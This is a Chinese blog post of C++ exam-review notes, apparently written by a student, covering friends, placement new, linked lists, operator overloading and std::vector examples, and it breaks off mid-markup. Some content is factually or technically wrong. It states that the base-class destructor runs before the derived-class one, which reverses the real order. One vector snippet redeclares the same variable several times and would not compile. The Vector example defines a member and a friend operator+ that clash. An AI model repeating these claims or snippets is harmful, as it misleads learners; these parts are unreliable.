    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇blog是读者所总结（cv大法均有包含出处，笔者水平有限，如果错误请指出（主要期末考总结了一下方便考前再次复习</p><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><p>在protected保护继承中，对于垂直访问等同于公有继承，对于水平访问等同于私有继承。</p><p>动态绑定是在运行时选定调用的成员函数的。</p><p>对于从基类继承的虚函数，派生类也可以不进行重定义。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405101909241.png" alt="image-20240509235749075" style="zoom:50%;" /><p>类A是类B的友元，说明类A是友元类</p><p>友元不能传递也不能继承：破坏封装性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">ClassA</span>;  <span class="comment">// 声明ClassA为友元类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateData = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> protectedData = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassA::display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Private Data: &quot;</span> &lt;&lt; b.privateData &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Protected Data: &quot;</span> &lt;&lt; b.protectedData &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在销毁派生类对象时，先调用基类的析构函数，再调用派生类的析构函数</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><code>new</code>出来的对象仅仅是调用对象的构造函数，new之后要显示的调用delete函数</p><p><code>palcement new</code>的主要用途就是反复使用一块较大的动态分配的内存来构造不同类型的对象或者他们的数组。placement new构造起来的对象或其数组，要显示的调用他们的<a href="https://so.csdn.net/so/search?q=%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">析构函数</a>来销毁，千万不要使用delete。</p><p>static修饰的对象时，只有在程序结束时才会调用析构函数，位于main函数中定义的对象之后</p><h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><p>友元的关键字为  <code>friend</code><br>友元的三种实现</p><ol><li>类做友元</li><li>成员函数做友元</li><li>全局函数做友元</li></ol><ul><li><p>friend修饰别的类</p><ul><li><p>友元类可以声明在类中任意位置。<code>friend class 类名</code></p></li><li><p>声明友元类之后，友元类中的所有成员函数都是该类的友元函数，能够访问该类的所有成员。</p></li></ul></li><li><p>friend修饰成员函数</p><ul><li><p>友元成员函数声明语法：<code>friend 函数返回值类型 类名::函数名();</code></p></li><li><p>注意定义的先后，建议在前面进行声明，后面进行函数的同一定义，防止出现问题。</p></li></ul></li><li><p>friend修饰类外定义的函数</p><ul><li><p>将类外部的普通函数作为类的友元函数，在类中使用friend关键字声明该普通函数就可以实现，友元函数可以在类中任意位置声明。</p></li><li><p>普通函数作为友元函数的声明形式如下所示： <code>friend 函数返回值类型 友元函数名（形参列表）</code></p></li></ul></li></ul><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表确实是一种重要的动态数据结构，它在许多情况下非常有用，但您的描述中有几点需要澄清和修正：</p><ol><li><strong>动态内存分配</strong>： 链表确实根据需要动态地开辟内存空间。每个新元素（通常称为节点）都是在需要时创建的，这使得链表在内存使用方面非常灵活。</li><li><strong>插入和删除的灵活性</strong>： 链表可以在几乎任何位置轻松地插入或删除节点。由于不需要像数组那样移动元素，这些操作通常很高效，尤其是当你可以直接访问到要操作的节点的前一个节点时。</li><li><strong>不支持随机访问</strong>： 链表<strong>不支持随机访问</strong>。数组支持高效的随机访问，即可以直接通过索引在常数时间内访问任何元素。而链表则需要从头开始遍历，直到到达所需的元素，这使得访问特定元素是线性时间的操作。</li><li><strong>内存和操作效率</strong>：<ul><li><strong>内存使用</strong>：相比于数组，链表的内存使用通常更高，因为每个节点不仅要存储数据，还需要存储至少一个指向列表中下一个节点的指针。在双向链表中，还需要存储指向前一个节点的指针。</li><li><strong>操作效率</strong>：链表的操作效率依赖于具体操作。对于在链表头部或已知位置插入和删除操作，链表非常高效。然而，对于需要搜索特定元素的操作，链表的效率通常低于数组，因为需要遍历链表元素。</li></ul></li><li><strong>节省内存</strong>： 链表不一定能节省内存，特别是当节点包含的数据较小时，额外的指针所需的内存可能会使得链表的总内存占用实际上高于同等数量的数组元素。</li></ol><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>在C++中，大多数运算符可以被重载为成员函数或非成员函数（包括友元函数），但并非所有运算符都可以用这三种方式重载。以下是一些关键点和例外：</p><h3 id="成员函数和非成员函数"><a href="#成员函数和非成员函数" class="headerlink" title="成员函数和非成员函数"></a>成员函数和非成员函数</h3><ul><li><strong>成员函数</strong>：当一个运算符被重载为成员函数时，它的第一个操作数必须是调用该成员函数的对象本身。这意味着，对于二元运算符，左操作数是对象本身，右操作数是作为参数传递的。</li><li><strong>非成员函数</strong>：这些通常被实现为普通函数或友元函数。友元函数虽然定义在类的外部，但它可以访问类的所有私有和保护成员。</li></ul><h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><ul><li><strong>友元函数</strong>：不是类的成员，但有权访问类的私有和保护成员。友元函数通常用于那些需要访问两个不同类对象的私有数据的运算符重载。</li></ul><h3 id="特殊运算符重载"><a href="#特殊运算符重载" class="headerlink" title="特殊运算符重载"></a>特殊运算符重载</h3><ul><li><strong>赋值运算符（<code>=</code>）</strong>：只能作为成员函数重载。这是因为赋值运算符需要改变对象自身的状态，且左侧操作数必须是类类型的对象。</li><li><strong>下标运算符（<code>[]</code>）</strong>、<strong>函数调用运算符（<code>()</code>）</strong>和<strong>箭头运算符（<code>-&gt;</code>）</strong>：也只能作为成员函数重载。</li><li><strong>递增（<code>++</code>）</strong>和<strong>递减（<code>--</code>）运算符</strong>：可以作为成员函数或非成员函数重载，但通常作为成员函数重载，以便可以直接修改对象的状态。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>举个例子，考虑一个简单的类<code>Vector</code>，我们可以重载加法运算符<code>+</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成员函数重载</span></span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; other) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;x + other.x, y + other.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数重载</span></span><br><span class="line">    <span class="keyword">friend</span> Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; lhs, <span class="type">const</span> Vector&amp; rhs) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;lhs.x + rhs.x, lhs.y + rhs.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这个例子中，加法运算符可以作为成员函数或非成员友元函数重载。选择哪种方式取决于具体需求，例如，如果需要访问两个不同对象的私有成员，则可能需要使用友元函数。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>虽然很多运算符可以以不同方式重载，但并非所有运算符都可以通过所有三种方式（成员、非成员、友元）重载。选择合适的重载方式取决于特定的需求和设计目标。</p><h2 id="实践实例"><a href="#实践实例" class="headerlink" title="实践实例"></a>实践实例</h2><h3 id="vector使用"><a href="#vector使用" class="headerlink" title="vector使用"></a>vector使用</h3><p>下面是一些<code>vector</code>的用法示例：</p><p>**创建和初始化<code>vector</code>**：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个空的vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个具有初始值的vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用push_back()逐个添加元素</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用指定大小和初始值创建vector</span></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">numbers</span><span class="params">(<span class="number">5</span>, <span class="number">0</span>)</span></span>;  <span class="comment">// 包含5个初始值为0的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>访问和修改<code>vector</code>中的元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过下标访问元素</span></span><br><span class="line">    std::cout &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; std::endl;  <span class="comment">// 输出：1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用at()函数访问元素（提供边界检查）</span></span><br><span class="line">    std::cout &lt;&lt; numbers.<span class="built_in">at</span>(<span class="number">2</span>) &lt;&lt; std::endl;  <span class="comment">// 输出：3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改元素的值</span></span><br><span class="line">    numbers[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>获取<code>vector</code>的大小和迭代访问</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取vector的大小</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; numbers.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用迭代器遍历vector</span></span><br><span class="line">    <span class="keyword">for</span> (std::vector&lt;<span class="type">int</span>&gt;::iterator it = numbers.<span class="built_in">begin</span>(); it != numbers.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        std::cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用范围-based for循环遍历vector（C++11及以上版本）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">        std::cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>插入和删除元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">    numbers.<span class="built_in">insert</span>(numbers.<span class="built_in">begin</span>() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// 在索引为2的位置插入10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在末尾添加元素</span></span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除指定位置的元素</span></span><br><span class="line">    numbers.<span class="built_in">erase</span>(numbers.<span class="built_in">begin</span>() + <span class="number">1</span>);  <span class="comment">// 删除索引为1的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除末尾的元素</span></span><br><span class="line">    numbers.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; numbers = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">        numbers.insert(numbers.begin() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// 在索引为2的位置插入10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在末尾添加元素</span></span><br><span class="line">        numbers.push_back(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除指定位置的元素</span></span><br><span class="line">        numbers.erase(numbers.begin() + <span class="number">1</span>);  <span class="comment">// 删除索引为1的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除末尾的元素</span></span><br><span class="line">        numbers.pop_back();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="公倍数以及公约数"><a href="#公倍数以及公约数" class="headerlink" title="公倍数以及公约数"></a>公倍数以及公约数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最大公约数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最小公倍数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">lcm</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a / gcd(a, b) * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="重载格式"><a href="#重载格式" class="headerlink" title="重载格式"></a>重载格式</h3><p>在C++中，运算符重载是一种允许为已有的运算符提供用户定义的实现的语言特性。这使得开发者可以对自定义数据类型使用标准运算符。下面提供了一些常见运算符的重载格式，包括成员函数和非成员函数（包括友元函数）的重载方式。</p><h3 id="1-加法运算符（-）"><a href="#1-加法运算符（-）" class="headerlink" title="1. 加法运算符（+）"></a>1. 加法运算符（<code>+</code>）</h3><p><strong>成员函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// 返回一个新对象，是当前对象和rhs的和</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* 构造逻辑 */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 返回lhs和rhs的和</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* 构造逻辑 */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-赋值运算符（-）"><a href="#2-赋值运算符（-）" class="headerlink" title="2. 赋值运算符（=）"></a>2. 赋值运算符（<code>=</code>）</h3><p><strong>成员函数形式</strong>（只能是成员函数）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>=(<span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 赋值逻辑</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;  <span class="comment">// 返回当前对象的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-下标运算符（-）"><a href="#3-下标运算符（-）" class="headerlink" title="3. 下标运算符（[]）"></a>3. 下标运算符（<code>[]</code>）</h3><p><strong>成员函数形式</strong>（只能是成员函数）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ElementType&amp; <span class="keyword">operator</span>[](<span class="type">int</span> index) &#123;</span><br><span class="line">        <span class="comment">// 返回对应索引的元素的引用</span></span><br><span class="line">        <span class="keyword">return</span> elements[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-递增运算符（-）"><a href="#4-递增运算符（-）" class="headerlink" title="4. 递增运算符（++）"></a>4. 递增运算符（<code>++</code>）</h3><p><strong>前缀递增</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">        <span class="comment">// 递增逻辑</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>后缀递增</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">        MyClass temp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 递增逻辑</span></span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-输出运算符（"><a href="#5-输出运算符（" class="headerlink" title="5. 输出运算符（&lt;&lt;）常用于输出流重载"></a>5. 输出运算符（<code>&lt;&lt;</code>）常用于输出流重载</h3><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> MyClass&amp; obj) &#123;</span><br><span class="line">        <span class="comment">// 输出obj的信息到os</span></span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="6-比较运算符（-）"><a href="#6-比较运算符（-）" class="headerlink" title="6. 比较运算符（==）"></a>6. 比较运算符（<code>==</code>）</h3><p><strong>成员函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// 返回比较结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* 比较逻辑 */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 